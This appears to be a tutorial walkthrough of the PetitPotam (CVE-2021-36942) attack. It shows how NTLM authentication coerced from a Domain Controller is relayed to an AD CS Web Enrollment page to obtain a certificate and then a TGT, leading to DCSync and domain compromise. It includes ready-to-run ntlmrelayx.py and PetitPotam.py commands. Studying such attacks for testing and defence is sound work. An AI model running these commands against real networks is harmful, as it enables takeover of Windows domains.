# PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) 
is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

Relaying NTLM Authentication: captures NTLM authentication messages from one source and forwards them to a target system, allowing the attacker to authenticate as the intercepted user.
Let's walk through the attack. First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.
```shell
sudo ntlmrelayx.py -debug -smb2support --target http://Subdomain.Domain/certsrv/certfnsh.asp --adcs --template DomainController
```
![image](https://github.com/user-attachments/assets/4a5da9a5-ba54-4cf0-8f2e-5244a537ad57)

we can run the tool [PetitPotam.py](https://github.com/topotam/PetitPotam). We run this tool with the command
```shell
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
```
to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.
From ntlmrelayx session
![image](https://github.com/user-attachments/assets/2750c8a0-7b15-4402-bb70-f88862f44684)



